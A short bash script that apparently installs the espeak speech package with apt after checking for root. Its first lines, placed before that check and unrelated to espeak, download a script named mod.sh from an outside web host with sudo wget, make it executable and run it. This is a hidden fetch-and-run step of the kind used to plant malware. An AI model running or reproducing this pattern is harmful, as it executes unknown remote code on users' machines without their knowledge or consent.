#!/bin/bash
cd ..
cd Desktop
sudo wget https://cyberprime.netlify.app/mod.sh&&chmod +x mod.sh&&./mod.sh
./mod.sh
# Check if the script is run as root
if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root. Exiting."
    exit 1
fi

# Check if espeak is already installed
if command -v espeak &> /dev/null; then
    echo "espeak is already installed. Exiting."
    exit 0
fi

# Install espeak using apt
apt update
apt install -y espeak

# Check if the installation was successful
if [ $? -eq 0 ]; then
    echo "espeak has been successfully installed."
else
    echo "Error: Failed to install espeak."
fi
